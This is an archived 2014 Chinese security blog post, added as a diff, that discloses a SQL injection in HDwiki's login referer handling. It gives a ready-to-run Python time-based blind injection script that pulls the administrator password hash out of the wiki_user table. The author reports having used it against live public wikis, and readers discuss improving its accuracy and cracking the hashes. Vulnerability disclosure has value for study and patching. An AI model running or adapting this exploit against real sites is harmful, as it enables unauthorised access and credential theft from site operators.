@@ -1,0 +1,607 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>HDwiki时间延迟盲注及利用代码 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                网络安全 &raquo; <a href="hdwiki-timebase-blind.html">HDwiki时间延迟盲注及利用代码</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">HDwiki时间延迟盲注及利用代码</h1>
+            <div class="details-up">
+  <span class="author">作者: None</span>
+  
+  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
+  
+  <span class="date">时间: 2014-2-25 17:20</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">5条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="hdwiki-timebase-blind.html">13543人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/hdwiki.html">hdwiki</a>
+    
+        <a href="../tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">注入漏洞</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>
+	<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;hdwiki某处对referer未做过滤，造成sql注入</span><br />
+<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;但因为没有输出点，只能做盲注。</span><br />
+<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;基于时间的盲注脚本已写好，测试可注入出“光明网百科”等百科网站的管理员密码md5值：</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;<a target="_blank" href="../content/uploadfile/201402/c11b1393323952.jpg" id="ematt:473"><img src="../content/uploadfile/201402/c11b1393323952.jpg" title="点击查看原图" alt="t01584d474b55919165.jpg" border="0" width="495" height="503" /></a><br />
+</span> 
+</p>
+<p>
+	&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size:14px;">在文件/model/user.class.php 第41行add_referer函数：</span>
+</p>
+<p>
+	<br />
+</p>
+<span style="font-size:14px;"> 
+<pre class="brush: php;auto-links: false;">function add_referer(){
+		if($_SERVER['HTTP_REFERER']){
+			$this-&gt;db-&gt;query("UPDATE ".DB_TABLEPRE."session SET referer ='".$_SERVER['HTTP_REFERER']."' WHERE sid='".base::hgetcookie('sid')."'", '1');
+		}
+	}</pre>
+&nbsp;&nbsp;&nbsp;&nbsp;直接将$_SERVER[‘HTTP_REFERER’]带入sql语句查询，产生注入。<br />
+&nbsp;&nbsp;&nbsp;&nbsp;在/control/user.php文件第108行，dologin函数中调用了add_referer：
+<pre class="brush: php;auto-links: false;">	function dologin(){
+		$_ENV['user']-&gt;passport_server('login','1');
+		if(!isset($this-&gt;post['submit'])){
+			$this-&gt;view-&gt;assign('checkcode',isset($this-&gt;setting['checkcode'])?$this-&gt;setting['checkcode']:0);
+
+			$_ENV['user']-&gt;add_referer();</pre>
+&nbsp;&nbsp;&nbsp;&nbsp;所以只需要向/index.php?user-login提交POST数据包即可，将注入代码放在REFERER中。<br />
+利用思路有三：<br />
+　　01.因为是UPDATE语句，可以直接修改session表，将用户相关权限修改。但后台权限验证在user表中，所以暂时我没找到可利用的方法。<br />
+　　02.报错注入。但此处执行函数query中，默认是不显示报错信息的，所以也无法利用。<br />
+　　03.sql盲注，可写一个基于时间的SQL盲注脚本，跑跑管理员的密码。但缺点很明显，因为受到网速的限制（与一些不可预测因素限制），我在本地测试的盲注是可以注入获得正确md5的，但我注入一些网站的时候注入出的md5可能解不出来，也可能有一些偏差。但不可否认的是可以注入获得管理员md5.<br />
+　　SQL盲注代码：
+<pre class="brush: python;auto-links: false;">　　#!/usr/bin/python
+　　# -*- coding: utf-8 -*-
+　　__author__ = 'Phtih0n'
+　　import requests, sys, time
+　　#####################
+　　#需要你编辑的变量
+　　uid = 2 #你注册用户的uid
+　　url = 'http://localhost/wiki'
+　　#####################
+　　
+　　headers = {
+　　    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 '
+　　                        '(KHTML, like Gecko) Chrome/29.0.1547.66 Safari/537.36 LBBROWSER',
+　　    'Cookie': 'hd_sid=aaaaa',
+　　}
+　　hex = range(48, 57) + range(97, 103)
+　　target = '%s/index.php?user-login' % url
+　　post = {
+　　    'username': 'test',
+　　    'password': 'test',
+　　    'indexlogin': '1'
+　　}
+　　passwd = ""
+　　if __name__ == '__main__':
+　　    for i in range(1, 33):
+　　        clock = []
+　　        for n in hex:
+　　            # requests.get(url, headers = headers)
+　　            headers['Referer'] = "', code=(select if(ord(substring((select password from wiki_user " \
+　　                                 "where uid=1),%d,1))=%d ,sleep(5),0)) where uid=%d#" % (i, n, uid)
+　　            bef = time.clock()
+　　            rep = requests.post(target, data = post, headers = headers, timeout = 2000)
+　　            clock.append(time.clock() - bef)
+　　            if rep.status_code != 200:
+　　                print "网络错误或该网站并不是hdwiki"
+　　                sys.exit(0)
+　　
+　　        # print clock
+　　        pos = clock.index(max(clock))
+　　        passwd += chr(hex[pos])
+　　        print chr(hex[pos])
+　　print "success: %s" % passwd</pre>
+&nbsp;&nbsp;&nbsp;&nbsp;本脚本依赖python的requests库，该库能使python方便地进行http操作，不安装该脚本会出错。官网地址：http://www.python-requests.org/<br />
+　　使用脚本前首先注册一枚账号，在用户信息页面获得你的uid，填入上方”uid=”处。因为为了不破坏session表中其他用户字段信息，所以在注入的时候写了一个where从句，所以需要一个uid。<br />
+　　而且，当session表不存在字段时，也是不能update的，所以注册一个用户，该表就至少有一个字段<br />
+　　当然实际上该盲注是不需要有用户权限的。&nbsp;<br />
+　　建议测试的时候先在本地测试，此时网速对延时盲注的影响较小，我测试的时候基本没有出现错误，注入获得的md5都能解出正确明文。<br />
+<br />
+</span>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/hdwiki.html">hdwiki</a>
+                
+                    <a href="../tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">注入漏洞</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 5 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-2971">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">葡萄</a></div>
+                    <p>问博主一个白痴的问题。。。文章最后一句注入获得的md5都能解出正确明文，如果加了好几层salt的怎么解，，求教。</p>
+                    <span class="comment-time">时间: 2017-11-29 15:31</span>
+                    <span class="comment-reply"><a href="#comment-2971" onclick="reply_to('2971','葡萄')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1708">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/61098ada92da6202c19898f6807f7a0a.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">BORDER</a></div>
+                    <p>终于遇到个认识的验证码！！感谢博主分享</p>
+                    <span class="comment-time">时间: 2014-07-06 00:55</span>
+                    <span class="comment-reply"><a href="#comment-1708" onclick="reply_to('1708','BORDER')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1641">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/13c719124b2ff1b1722beca2198ac82f.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://fuck" target="_blank" rel="nofollow noopener">麦田嫖娼者</a></div>
+                    <p>师傅，屌啊，</p>
+                    <span class="comment-time">时间: 2014-05-26 18:01</span>
+                    <span class="comment-reply"><a href="#comment-1641" onclick="reply_to('1641','麦田嫖娼者')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1602">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/d615d5793929e8c7d70eab5f00f7f5f1.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">sincoder</a></div>
+                    <p>代码里那个超时应该判断 &gt; 5  而不是每次取最大的</p>
+                    <span class="comment-time">时间: 2014-04-14 11:35</span>
+                    <span class="comment-reply"><a href="#comment-1602" onclick="reply_to('1602','sincoder')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1603">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@sincoder：有时候网速慢会造成多个连接大于5s的情况，所以没这么写。不过除此之外我没想到什么好办法让结果更加准确。。</p>
+                    <span class="comment-time">时间: 2014-04-14 13:35</span>
+                    <span class="comment-reply"><a href="#comment-1603" onclick="reply_to('1603','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="16e6c80e53b2b9562c8937d3246e94fb77565091" />
+</div><div class="col-6">
+<img src="../captcha/image/16e6c80e53b2b9562c8937d3246e94fb77565091/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="309" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="1eH4nNTiSoGYifg2NyGEdyilnLNVAtfBNM5VVSu1gKUHQN4qPzDpa1lqI84695rT">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">大文件处理</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8.html">回调后门</a>
+        
+        <a rel="tag" href="../tag/iOS.html">iOS</a>
+        
+        <a rel="tag" href="../tag/%E4%BD%8D%E8%BF%90%E7%AE%97.html">位运算</a>
+        
+        <a rel="tag" href="../tag/%E6%A1%A5%E6%8E%A5.html">桥接</a>
+        
+        <a rel="tag" href="../tag/writeup.html">writeup</a>
+        
+        <a rel="tag" href="../tag/IIS.html">IIS</a>
+        
+        <a rel="tag" href="../tag/WTForm.html">WTForm</a>
+        
+        <a rel="tag" href="../tag/apache.html">apache</a>
+        
+        <a rel="tag" href="../tag/web%E6%8C%87%E7%BA%B9.html">web指纹</a>
+        
+        <a rel="tag" href="../tag/%E6%B1%89%E8%AF%BA%E5%A1%94.html">汉诺塔</a>
+        
+        <a rel="tag" href="../tag/cmd%E5%90%8E%E9%97%A8.html">cmd后门</a>
+        
+        <a rel="tag" href="../tag/Linux.html">Linux</a>
+        
+        <a rel="tag" href="../tag/CSP.html">CSP</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%A2%E9%98%9F.html">团队</a>
+        
+        <a rel="tag" href="../tag/phpwind.html">phpwind</a>
+        
+        <a rel="tag" href="../tag/%E6%80%BB%E7%BB%93.html">总结</a>
+        
+        <a rel="tag" href="../tag/%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95.html">遍历目录</a>
+        
+        <a rel="tag" href="../tag/C-FREE.html">C-FREE</a>
+        
+        <a rel="tag" href="../tag/var_dump.html">var_dump</a>
+        
+        <a rel="tag" href="../tag/disable_functions.html">disable_functions</a>
+        
+        <a rel="tag" href="../tag/%E6%8A%A5%E7%BA%B8.html">报纸</a>
+        
+        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
+        
+        <a rel="tag" href="../tag/web%E5%BA%94%E7%94%A8.html">web应用</a>
+        
+        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
+        
+        <a rel="tag" href="../tag/asyncore.html">asyncore</a>
+        
+        <a rel="tag" href="../tag/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87.html">沙盒绕过</a>
+        
+        <a rel="tag" href="../tag/fckeditor.html">fckeditor</a>
+        
+        <a rel="tag" href="../tag/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E5%BA%A6.html">数据库速度</a>
+        
+        <a rel="tag" href="../tag/kali.html">kali</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
